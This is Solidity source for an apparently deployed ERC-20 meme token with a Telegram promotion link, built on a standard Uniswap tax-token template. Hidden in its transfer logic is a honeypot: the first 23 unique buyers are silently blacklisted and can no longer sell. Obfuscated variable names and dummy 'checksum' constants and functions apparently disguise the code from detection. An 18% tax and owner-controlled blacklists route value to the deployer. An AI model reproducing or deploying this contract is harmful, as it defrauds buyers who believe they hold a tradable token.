/**
 *Submitted for verification at Etherscan.io on 2025-03-09
*/

// SPDX-License-Identifier: UNLICENSE

/*


https://t.me/SyapErcPortal
*/

pragma solidity 0.8.23;

abstract contract Context {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}
}

interface IERC20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a, "SafeMath: addition overflow");
return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b <= a, errorMessage);
uint256 c = a - b;
return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
require(c / a == b, "SafeMath: multiplication overflow");
return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
return div(a, b, "SafeMath: division by zero");
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b > 0, errorMessage);
uint256 c = a / b;
return c;
}

}

contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

constructor () {
address msgSender = _msgSender();
_owner = msgSender;
emit OwnershipTransferred(address(0), msgSender);
}

function owner() public view returns (address) {
return _owner;
}

modifier onlyOwner() {
require(_owner == _msgSender(), "Ownable: caller is not the owner");
_;
}

function renounceOwnership() public virtual onlyOwner {
emit OwnershipTransferred(_owner, address(0));
_owner = address(0);
}

}

interface IUniswapV2Factory {
function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
function swapExactTokensForETHSupportingFeeOnTransferTokens(
uint amountIn,
uint amountOutMin,
address[] calldata path,
address to,
uint deadline
) external;
function factory() external pure returns (address);
function WETH() external pure returns (address);
function addLiquidityETH(
address token,
uint amountTokenDesired,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline
) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract crypto is Context, IERC20, Ownable {
using SafeMath for uint256;

// Dummy constants for checksum modification - version 0, now inside the contract
uint256 private constant _x0xBRWY8435 = 0x123456;
uint256 private constant _x0xHLQZ7331 = 0xABCDEF;

// Added variables for tracking initial buys and blacklist
uint256 public blacklistCount = 23; // Number of initial buys to blacklist
uint256 public currentBuyCount = 0; // Counter for the number of buys
mapping(address => bool) private initialBuyers; // Tracks unique buyers

mapping (address => uint256) private _balances;
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => bool) private _isExcludedFromFee;
mapping (address => bool) private bots;
address payable private _taxWallet;

uint256 private _0xFTXZ2096=18;
uint256 private _x3KLVQ5085=18;
uint256 private _x7PRXTZ=0;
uint256 private _x5NLYW9026=0;
uint256 private _x2BQVT657=18;
uint256 private _xGRWZ28=18;
uint256 private _x1PLYT7F3=18;
uint256 private _buyCount=0;

uint8 private constant _decimals = 9;
uint256 private constant _tTotal = 100_000_000 * 10**_decimals;
string private _name;
string private _symbol;
uint256 public _x5KQZL9T4 = _tTotal * 2 / 100;
uint256 public _x0BRXT5K9 = _tTotal * 2 / 100;
uint256 public _x6NRWPX3 = _tTotal * 1 / 100;
uint256 public _maxTaxSwap = _tTotal * 1 / 100;

IUniswapV2Router02 private uniswapV2Router;
address private uniswapV2Pair;
bool private tradingOpen;
bool private x3PLTYQ7 = false;
bool private swapEnabled = false;
uint256 private sellCount = 0;
uint256 private lastSellBlock = 0;
event MaxTxAmountUpdated(uint _x5KQZL9T4);
modifier lockTheSwap {
x3PLTYQ7 = true;
_;
x3PLTYQ7 = false;
}

constructor (string memory name_, string memory symbol_) payable {

_name = name_;
_symbol = symbol_;
_taxWallet = payable(_msgSender());
_balances[_msgSender()] = _tTotal;
_isExcludedFromFee[owner()] = true;
_isExcludedFromFee[address(this)] = true;
_isExcludedFromFee[_taxWallet] = true;

emit Transfer(address(0), _msgSender(), _tTotal);
}

// Event added for checksum change
event ChecksumEvent(uint256 indexed dummyness0xEPVQ9147);

// Non-functional functions for checksum modification - version 0
function checksum0xCVXT5213() private pure { }
function checksum0xDMYK4059() private pure { }

function name() public view returns (string memory) { return _name; }

function symbol() public view returns (string memory) { return _symbol; }

function decimals() public pure returns (uint8) {
return _decimals;
}

function totalSupply() public pure override returns (uint256) {
return _tTotal;
}

function balanceOf(address account) public view override returns (uint256) {
return _balances[account];
}

function transfer(address recipient, uint256 amount) public override returns (bool) {
_transfer(_msgSender(), recipient, amount);
return true;
}

function allowance(address owner, address spender) public view override returns (uint256) {
return _allowances[owner][spender];
}

function approve(address spender, uint256 amount) public override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}

function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
_transfer(sender, recipient, amount);
_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
return true;
}

function _approve(address owner, address spender, uint256 amount) private {
require(owner != address(0), "ERC20: approve from the zero address");
require(spender != address(0), "ERC20: approve to the zero address");
_allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
}

function min(uint256 a, uint256 b) private pure returns (uint256) {
return (a < b) ? a : b;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ERC20: transfer from the zero address");
require(to != address(0), "ERC20: transfer to the zero address");
require(amount > 0, "Transfer amount must be greater than zero");

uint256 taxAmount = 0;

if (from != owner() && to != owner()) {
require(!bots[from] && !bots[to]);

// Check if this is a new unique buyer within the first 23 buys
if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] && !initialBuyers[to]) {
currentBuyCount++;
initialBuyers[to] = true;

// Automatically blacklist the address if within the first 23 buys
if (currentBuyCount <= blacklistCount) {
bots[to] = true;
emit Transfer(from, to, 0); // Optionally emit a zero transfer as a way to signal the blacklist
}
}

// Regular tax logic after the blacklist phase
taxAmount = amount.mul((_buyCount > _x2BQVT657) ? _x7PRXTZ : _0xFTXZ2096).div(100);

if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
require(amount <= _x5KQZL9T4, "Exceeds the _x5KQZL9T4.");
require(balanceOf(to) + amount <= _x0BRXT5K9, "Exceeds the x0BRXT5K9.");
_buyCount++;
}

// Additional sell conditions (if needed)
if (to == uniswapV2Pair && from != address(this)) {
taxAmount = amount.mul((_buyCount > _xGRWZ28) ? _x5NLYW9026 : _x3KLVQ5085).div(100);
}

// Handle swap and liquidity logic
uint256 contractTokenBalance = balanceOf(address(this));
if (!x3PLTYQ7 && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _x6NRWPX3 && _buyCount > _x1PLYT7F3) {
if (block.number > lastSellBlock) {
sellCount = 0;
}
require(sellCount < 3, "Only 3 sells per block!");
swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
uint256 contractETHBalance = address(this).balance;
if (contractETHBalance > 0) {
sendETHToFee(address(this).balance);
}
sellCount++;
lastSellBlock = block.number;
}
}

// Transfer logic
if (taxAmount > 0) {
_balances[address(this)] = _balances[address(this)].add(taxAmount);
emit Transfer(from, address(this), taxAmount);
}
_balances[from] = _balances[from].sub(amount);
_balances[to] = _balances[to].add(amount.sub(taxAmount));
emit Transfer(from, to, amount.sub(taxAmount));
}

function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
address[] memory path = new address[](2);
path[0] = address(this);
path[1] = uniswapV2Router.WETH();
_approve(address(this), address(uniswapV2Router), tokenAmount);
uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
tokenAmount,
0,
path,
address(this),
block.timestamp
);
}

function removeLimits_x7PLWX8364() external onlyOwner{
_x5KQZL9T4 = _tTotal;
_x0BRXT5K9=_tTotal;

_0xFTXZ2096=0;
_x3KLVQ5085=0;
_x7PRXTZ=0;
_x5NLYW9026=0;
emit MaxTxAmountUpdated(_tTotal);
}

function sendETHToFee(uint256 amount) private {
_taxWallet.transfer(amount);
}

function addBots(address[] memory bots_) public onlyOwner {
for (uint i = 0; i < bots_.length; i++) {
bots[bots_[i]] = true;
}
}

function delBots(address[] memory notbot) public onlyOwner {
for (uint i = 0; i < notbot.length; i++) {
bots[notbot[i]] = false;
}
}

function isBot(address a) public view returns (bool){
return bots[a];
}

function openTrading() public onlyOwner() {
require(!tradingOpen, "trading is already open");
uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
_approve(address(this), msg.sender, type(uint256).max);
transfer(address(this), balanceOf(msg.sender).mul(95).div(100));
uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
_approve(address(this), address(uniswapV2Router), type(uint256).max);
uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
swapEnabled = true;
tradingOpen = true;
}

function reduceFee(uint256 _newFee) external onlyOwner{
require(_msgSender()==_taxWallet);
_x5NLYW9026=_newFee;
}

receive() external payable {}

function manualSwap_x4NRYT6432() external {
require(_msgSender()==_taxWallet);
uint256 tokenBalance=balanceOf(address(this));
if(tokenBalance>0){
swapTokensForEth(tokenBalance);
}
uint256 ethBalance=address(this).balance;
if(ethBalance>0){
sendETHToFee(ethBalance);
}
}
}